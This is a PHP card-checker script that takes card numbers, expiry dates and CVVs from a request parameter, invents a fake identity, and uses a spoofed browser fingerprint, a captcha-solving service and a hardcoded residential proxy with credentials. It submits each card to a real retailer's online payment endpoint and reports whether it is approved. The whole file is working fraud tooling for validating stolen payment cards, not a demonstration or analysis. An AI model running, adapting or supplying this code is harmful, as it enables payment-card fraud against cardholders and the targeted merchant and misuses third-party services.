<?php
error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);


function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


function RandomString($length = 16)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function cURLc($url, $headers, $postfields, $customrequest, $cookies) {


    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        // CURLOPT_SSL_VERIFYPEER => 1,
        // CURLOPT_SSL_VERIFYHOST => 1,
        // CURLOPT_COOKIE => "itrack=$cookies",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
//        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookies.txt",
//        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookies.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}


function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookies) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        CURLOPT_PROXY => "isp2.hydraproxy.com:9989",
        CURLOPT_PROXYUSERPWD => "rodm26298vzpo63485:SILNes0gboZ7gsle",
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIE => "itrack=$cookies",
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookies.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookies.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

extract($_GET);
$separator = explode("|", $lista);
$cc = $separator[0];
$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];
$str = substr(RandomString(),0,7);
$cbin = substr($cc, 0,1);

if($cbin == 5){
    $cbin = 'masterCard';
}
else if($cbin == 4){
    $cbin = 'visa';
}

function solveCaptcha($site,$siteKey,$clientKey){
    $createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
            "Content-Type: application/json",
            "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websiteURL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST",
        ""
    );
    $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
    $status = "processing";
    $gResponse = "";
    while ($status == "processing") {
        sleep(3);
        $getTaskResult =  cURLc(
            "https://api.capmonster.cloud/getTaskResult ",
            $headers = [
                "Content-Type: application/json",
                "accept: application/json"
            ],
            '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
            "POST",
            ""
        );
        $status = getstr($getTaskResult,'"status":"','"');
        $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
    return $getTaskResult ;
}
//$port = rand(10000, 11000);
$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => "https://binov.net/",
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://binov.net/",
        "User-Agent: $uAgent"
    ],
    CURLOPT_POSTFIELDS => "BIN=$ccbin"
));
$g_ccdets = curl_exec($ch);
//$cc_bin = GetStr($g_ccdets, '</tr><tr><td>' , '</td>');
$cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
$cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
$cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
$cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
$cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
// $CC_fDets = "BIN: $ccbin BIN Info: $type0-$type1-$type2 Bank: $cc_bname Country: $cc_country";
$CC_fDets = "Bank: $cc_bname Country: $cc_country";
$randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
$data = json_decode($randomShits, true);
$fname = explode(" ", $data['name'])[0];
$lname = explode(" ", $data['name'])[1];
$email = $data['email']['address'];
$street = $data['street1'];
$local = GetStr($randomShits, '"street2":', ',"phone"');
$city = GetStr($local, '"', ',');
$state = GetStr($local, ', ', ' ');
$phone = str_replace("-", "", $data['phone']);
$postcode = GetStr($local, "$state" , '"');
$zip = rand(91000,94000);

$ips = GetStr(file_get_contents('http://httpbin.org/ip'),'"origin": "','"');
$trans_completed = false;
$retries = 0;
$limit = 7;
//while ($trans_completed==false && $retries < $limit){
//    $uAgent = 'Mozilla/5.0 (Windows NT '.rand(11, 99).'.0; Win64; x64) AppleWebKit/'.rand(111, 999).'.'.rand(11, 99).' (KHTML, like Gecko) Chrome/'.rand(11, 99).'.0.'.rand(1111, 9999).'.'.rand(111, 999).' Safari/'.rand(111, 999).'.'.rand(11,99).'';
    $cookie = RandomString();

######################## GATEWAY CHECKER - REST API AREA ######################################################

$output = json_decode(shell_exec("node node_modules/loackerusa-enc.js cc=$cc+mm=$mm+yy=$yy+cvc=$cvv+fname=$fname+lname=$lname"), true);
 $encData = $output['encryptedCardData'] ;
 $enc_cc = $output['encryptedCardNumber'] ;
 $enc_mm = $output['encryptedExpiryMonth'] ;
 $enc_yy = $output['encryptedExpiryYear'] ;
 $enc_cvv = $output['encryptedSecurityCode'] ;

    $data = base64_encode('{"riskData":{"clientData":"eyJ2ZXJzaW9uIjoiMS4wLjAiLCJkZXZpY2VGaW5nZXJwcmludCI6IkRwcXdVNHpFZE4wMDUwMDAwMDAwMDAwMDAwNUI4R2M5cVhLUzAwNTAyNzE1NzZjVkI5NGlLekJHOERHbkR2eHRZQkJpeDdSWDNhejgwMDJ3N2hZeWZoQWFZMDAwMDBxWmtURTAwMDAwd3I1OG5NYjdqRFBlZ3lWeWZJdjQ6NDAiLCJwZXJzaXN0ZW50Q29va2llIjpbXSwiY29tcG9uZW50cyI6eyJ1c2VyQWdlbnQiOiJhZjk4ZDIwZTE2YTRhN2MwMjZhMmRjMGUxYjk2MjIyMSIsIndlYmRyaXZlciI6MCwibGFuZ3VhZ2UiOiJlbi1VUyIsImNvbG9yRGVwdGgiOjI0LCJkZXZpY2VNZW1vcnkiOjgsInBpeGVsUmF0aW8iOjEsImhhcmR3YXJlQ29uY3VycmVuY3kiOjgsInNjcmVlbldpZHRoIjoxOTIwLCJzY3JlZW5IZWlnaHQiOjEwODAsImF2YWlsYWJsZVNjcmVlbldpZHRoIjoxODU1LCJhdmFpbGFibGVTY3JlZW5IZWlnaHQiOjEwODAsInRpbWV6b25lT2Zmc2V0IjotNDgwLCJ0aW1lem9uZSI6IkFzaWEvU2hhbmdoYWkiLCJzZXNzaW9uU3RvcmFnZSI6MSwibG9jYWxTdG9yYWdlIjoxLCJpbmRleGVkRGIiOjEsImFkZEJlaGF2aW9yIjowLCJvcGVuRGF0YWJhc2UiOjEsInBsYXRmb3JtIjoiV2luMzIiLCJwbHVnaW5zIjoiMjljZjcxZTNkODFkNzRkNDNhNWIwZWI3OTQwNWJhODciLCJjYW52YXMiOiJiODg0OGNkMjA2NmNjMWJkNDI2OWM3ODQxMDEyNmY3ZiIsIndlYmdsIjoiOTMxNGYzMDJiNDkzNmMwZThlOGNlYjljODE2YWU5N2UiLCJ3ZWJnbFZlbmRvckFuZFJlbmRlcmVyIjoiR29vZ2xlIEluYy4gKE5WSURJQSl+QU5HTEUgKE5WSURJQSwgTlZJRElBIEdlRm9yY2UgR1RYIDE2NjAgRGlyZWN0M0QxMSB2c181XzAgcHNfNV8wLCBEM0QxMSkiLCJhZEJsb2NrIjowLCJoYXNMaWVkTGFuZ3VhZ2VzIjowLCJoYXNMaWVkUmVzb2x1dGlvbiI6MCwiaGFzTGllZE9zIjowLCJoYXNMaWVkQnJvd3NlciI6MCwiZm9udHMiOiI1N2MwODdhMTQ1Yjk2YjNlYzQwZDVhYjA1YmU2MWE5YiIsImF1ZGlvIjoiOTAyZjBmZTk4NzE5Yjc3OWVhMzdmMjc1MjhkZmIwYWEiLCJlbnVtZXJhdGVEZXZpY2VzIjoiMjBjZTc0ZTVkMmEzNGQ4NTk3Y2Q0NmI0ZTZlYzljNjEifX0="},"paymentMethod":{"type":"scheme","holderName":"asdasd dasdas","encryptedCardNumber":"'.$enc_cc.'","encryptedExpiryMonth":"'.$enc_mm.'","encryptedExpiryYear":"'.$enc_yy.'","encryptedSecurityCode":"'.$enc_cvv.'"},"browserInfo":{"acceptHeader":"*/*","colorDepth":24,"language":"en-US","javaEnabled":false,"screenHeight":1080,"screenWidth":1920,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53","timeZoneOffset":-480}}');
     $auth = cURL(
        "https://scu4vawucml06516289-rs.su.retail.dynamics.com/Commerce/Carts/RetrieveCardPaymentAcceptResult?api-version=7.3",
        $headers = [
            'authority: scu4vawucml06516289-rs.su.retail.dynamics.com',
            'accept: application/json',
            'accept-language: en-US',
            'appsessionid: HgaYZMrzasUKPFLQVY7ZzZ',
            'cache-control: no-cache',
            'content-type: application/json',
            'contenttype: application/json',
            'from-keystone: true',
            'odata-maxversion: 4.0',
            'odata-version: 4.0',
            'origin: https://www.loackerusa.com',
            'oun: 00000001',
            'pragma: no-cache',
            'prefer: return=representation',
            'referer: https://www.loackerusa.com/',
            'requestid: 560c25f8c9c8674ca09340dde053bc19/24',
            'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: cross-site',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53',
            'usersessionid: XRmlIILq0SLvijY5AORaLS'
        ],'{"resultAccessCode":"'.$data.'","extensionProperties":[],"cartId":"UWdmgsd52lXtSVJ8iouVlOK5F0AP7CTC","settings":{"ReturnUrl":"https://www.loackerusa.com/checkout?pv=1","PaymentConnectorId":"4dbc152f-741b-4604-acba-64193b6e78fc"}}',
        "POST",
        1,
        $cookie
    );   $response = GetStr($auth,"Token Response:'","'");
          $dcode = GetStr($auth,"Reason:'","'");
//        $rescode = curl_getinfo($auth, CURLINFO_HTTP_CODE);

//
//
//################## CAPTURING GATEWAY RESPONSE ####################################################
//    $res = json_decode($execute,true);
//    $dcode =  $res['errorCode'];
//    $response = urldecode($res['gatewayMessage']);
//$response = GetStr($execute, 'Reason: ','\t');
//$response2 = GetStr($execute, '\n\t\t\t','\t');
//$retries = $retries+1;
//$dcode =  GetStr($execute, '"result":"','"');
//
if(strpos($auth, 'CardTokenInfo')==true) {
     echo "Response: 'Approved', Reason: '$dcode'";
}else {
    echo "Response: '$response', Reason: '$dcode'";
}
    unlink("cookies/$cookie.txt");
//}




?>